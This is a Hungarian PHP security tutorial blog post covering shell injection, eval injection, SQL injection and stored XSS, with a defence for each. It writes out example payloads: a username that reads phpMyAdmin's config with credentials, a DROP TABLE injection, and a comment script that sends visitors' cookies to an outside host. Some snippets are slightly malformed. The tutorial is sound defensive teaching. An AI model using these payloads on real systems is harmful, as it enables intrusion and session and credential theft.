---
id: 149
title: 'Önvédelmi gyakorlatok &#8211; 1. rész'
date: '2015-01-22T11:27:14+01:00'
author: tacsiazuma
layout: post
guid: '{{ site.url }}/?p=149'
permalink: /2015/01/22/onvedelmi-gyakorlatok-1-resz/
dsq_thread_id:
    - '3444670840'
    - '3444670840'
tie_post_bg:
    - ''
    - ''
tie_post_color:
    - ''
    - ''
tie_gallery_style:
    - slider
    - slider
tie_link_url:
    - ''
    - ''
tie_link_desc:
    - ''
    - ''
tie_video_url:
    - ''
    - ''
tie_embed_code:
    - ''
    - ''
tie_audio_mp3:
    - ''
    - ''
tie_audio_m4a:
    - ''
    - ''
tie_audio_oga:
    - ''
    - ''
tie_audio_soundcloud:
    - ''
    - ''
tie_quote_author:
    - ''
    - ''
tie_quote_link:
    - ''
    - ''
tie_quote_text:
    - ''
    - ''
tie_status_facebook:
    - ''
    - ''
tie_status_twitter:
    - ''
    - ''
categories:
    - Intermediate
    - PHP
    - Security
tags:
    - csrf
    - fixation
    - hijacking
    - php
    - session
    - token
    - xss
---

Aki már helyezett ki kódot éles környezetbe (és volt némi felelősségérzete persze :D) abban bizonyára felmerült többször is, hogy "vajon mindent megtettem a szerverem biztonsága érdekében?". Nos a PHP, mint mondtam egy olyan nyelv, amin viszonylag korán el tudunk érni sikereket és ettől felbátorodva idő előtt éles környezetbe helyezzük a kódunkat, akár csak haveri alapon, saját célra valami kis oldalra. A gondot viszont az jelenti, ha valaki fizetett azért a "lukas" kódért, ami ott várja a neten a mókás kedvű arra tévedő 5. osztályosokat. Persze ez a probléma nem csak kezdőket érinthet, hiszen egy nagy, nehezen átlátható rendszerben is ( a kellő tervezés nélkül ) becsúszhat egy hiba és máris kész a baj.

Az internetes támadások célja az esetek többségében az, hogy kódot futtassanak le az azt böngésző kliensen vagy a szerverünkön. Ezeket nevezzük code injectionnek és elég sok fajtája van. A probléma mindig abban rejlik, hogy megbíztunk a felhasználóban. **Nem szabad!** Félreértés ne essék, nekünk fontosak a felhasználók, de ha 100.000-ből csak egy látogató akar rosszat, az már pont elég. Már korábban is mondtam, hogy az internet, lévén bárki számára elérhető roppant veszélyes hely és ennek megfelelően kell kezelni. De térjünk vissza a félelmeink tárgyára, kezdjük a legbrutálisabb verzióval.

#### Shell injection

Ez bizony egy nagyon csúnya hiba és ha valaki ilyenbe belefut, akkor az könnyen "végzetes" lehet. A dolog lényege az, hogy a kedves felhasználónk az oldalon valamilyen adatot visz be és mi ezt az adatot mindenféle ellenőrzés nélkül átadjuk egy `exec()/passthru()` függvénynek. A problémát még inkább tetézi, ha a webszerverünk process-e több jogosultsággal fut, mint kellene. Képzeljük el az alábbi példát:

```
<pre class="de1" data-language="php"><span class="br0">passthru('/bin/logger/log -login '. $_POST['username']</span>]);
```

A lényeg, hogy van egy olyan programunk, amivel valami külön logolást végzünk és ennek átadjuk a nevet, hogy logolja, mint bejelentkezést. Amit mi átadtunk az egy egyszerű string, mi baj lehetne? Hát a baj akkor van, ha a kedves felhasználónk vicces felhasználónevet talált ki magának. Pl. "trolo && cat /opt/lampp/phpmyadmin/config.inc.php"

Ez a terminálban így fog kinézni:

```
<pre class="de1" data-language="shell"><span class="br0">/bin/logger/log -login </span>trolo && cat /opt/lampp/phpmyadmin/config.inc.php
```

Büszkén logoljuk, hogy a trolo nevű felhasználó belépett és utána jöhet a következő parancs... Nem is figyeltünk oda és kedves barátunknak már ki is írtuk a phpmyadmin konfigurációját, amiben pl. szerepel az SQL adatbázisunk helye, portja, felhasználónevünk és jelszavunk is. (Az már egy másik kérdés, hogy phpmyadmint használni éles környezetben szintén gyakorló életveszély)

> Mi a megoldás?

NE, ismétlem **NE** használjunk exec() és passthru() függvényeket. Sőt, a php.ini fájlban ajánlott ki is kapcsolni őket, így nem lehet használni PHP környezetben azt.

```
<pre data-language="shell">disable_functions = exec,passthru,eval,shell_exec,system,proc_open,popen,curl_exec, curl_multi_exec, parse_ini_file,show_source // itt szerepelnek mások is, de nem mindre fogok kitérni
```

Ha mégis használni akarjuk valamilyen okból, akkor ezeket a stringeket az `escapeshellargs()` és `escapeshellcmd()` függvényekkel lehet helyretenni, ellenben továbbra is azt vallom, hogy ahol az `exec()` függvényre szükség van, ott valami gond van.

#### PHP injection

Szintén gyakorló életveszély kategória. A legtöbb ilyen probléma egyébként szimplán a fordítóprogramok adta lehetőségeket használja ki. Ehhez nem árt ismerni, hogy is működnek a fordítóprogramok, de ebben a cikkben semmiképp nem tudom kitárgyalni a dolgot. Itt hasonló a helyzet, kódot futtatunk, aminek egy részét a user szolgáltatta, csak ez esetben az `eval()` függvény a felelős a gaztettekért. Vegyük a következőt:

```
<pre class="de1" data-language="php"> eval('echo "Te kis '+ $_POST['username'+ '!";');
```

Igen, elég láma példa, de szemléltetésnek megteszi. Ismét vicces felhasználónévvel jövünk elő:

```
<pre data-language="php">"; phpinfo(); // "
```

Így a futtatott PHP kód a következőképp fog kinézni:

```
<pre data-language="php">echo "Te kis "; phpinfo(); // "!";
```

Bizony, ismét cs\*csre futottunk, kiírattunk mindent, amit a php/apache környezetről bárki tudni szeretne. Ugyanis hiába egy sorban vannak, a PHP fordításakor tokeneket képez és teljesen mindegy, hogy szóköz vagy enter választja el őket, amíg a pontosvesszővel lezártuk az előzőt.

Solution: Ne használjuk az eval() függvényt, vagy a usertől elszeparált API-n keresztül érjük azt el.

#### SQL Injection

A jó öreg SQL injection. Mivel PHP kódunk az esetek zömében adatbázis kapcsolatot igényel és ennek döntő többsége SQL alapú (habár mostanában törnek fel a NoSQL megoldások is), ezért itt sem árt vigyázni, mivel ezt nem nagyon tudjuk kihagyni a rendszerből, mint az előbbi két példát.  
A dolog lényege itt is az, hogy simán hagytuk a felhasználót, hogy megerőszakoljon egy stringet és kérdés nélkül elfogadtuk azt.

Vegyük a következő példát, szimpla regisztráció.

$db->query("INSERT INTO users ( `username`,`email`,`realname`) VALUES ('$username','$email','$realname')");

Ajajajj. Nagy a baj, épp most regisztrált az oldalunkra Mr. trolo','a','b'); DROP TABLE users;

Így a lekérdezésünk a következőképpen alakult:

INSERT INTO user (username`,`email`,`realname`) VALUES ('Mr. trolo','a','b'); DROP TABLE users;

[![gonvu](assets/uploads/2015/01/gonvu-300x168.jpg)  
E](assets/uploads/2015/01/gonvu.jpg)z ellen kétféleképp tudunk védekezni:

1. Nem használunk SQL adatbázist, hanem NoSQL megoldásokkal operálunk (ez azért csücskös).
2. Escapeljük a stringeket a mysqli\_real\_escape\_string()-el és hasonlókkal, bár ez már kissé idejétmúlt megoldás
3. Prepared statementeket használunk. Ennek tárgyalása nem fér bele az időkeretbe, de hasonlóképp képzeljük el, mint egy printf()-et.

A dolog lényege, hogy mindig OTT escapeljük, ahol épp kell, tehát jelen esetben az adatbázisunkban. A függvényeinket kommenteljük, hogy lássák mások is és mi is, hogy az escaped vagy nem escaped értékeket vár, hogy később ne kavarodjunk bele.

#### XSS, alias cross site scripting

Ennek kétféle módja van, perzisztens és nem perzisztens, ellenben a kettő közti különbségre most nem térnék ki, mert már így is túl sokat árultam el 🙂

Vegyünk egy perzisztens fajtát. Jöjjön egy fórum, vagy blog, ahol a kommenteket a szerver direktben megjeleníti. Így ha valaki okos és ügyes, akkor a következő hozzászólással bizony ellophatja a sütijeinket:

```
<pre data-language="javascript"><script type="text/javascript">
$(document).ready(function(){
   myhost = myhost.com/got/your/cookie
   $.ajax({ host: myhost,
             type : "POST",
             data: { cookies : document.cookie },
             success: function() {
               //  alert('Gratulálok, Ön nyert!'); nem lenne sok értelme jelezni, hogy gondot okoztunk
             }
   })
});</script>Igen, szerintem is így van! :)
```

Nos az oldal üzemeltetője és mások számára ez csupán egy szimpla hozzászólás, hiszen a script![cookie-monster-your-edm](assets/uploads/2015/01/cookie-monster-your-edm-300x169.jpg) tag-ek közé zárt szöveget alapesetben nem íratja ki az oldal. Mondhatnánk, hogy mégis kit érdekel, hogy ellopta a sütiket? Nos, az tartalmazhat sokmindent, hogy csak egy példát hozzak: PHPSESSID, arról nem is beszélve, hogy egyesek szenzitív információkat is tárolnak sütikben. Nincs más dolga az illetőnek, mint ülni otthon és csemegézni a saját kis API-ja által bezsákmányolt információkon.

Solution: A változók kiíratásakor mindenképpen escape-ljük az adott szöveget a htmlentities() vagy htmlspecialchars()-al és ez esetben tiszta szövegként értelmezi a kapott html elemeket is.

A következő részben kitérek a CSRF támadásra és Session fixating/hijacking-ra.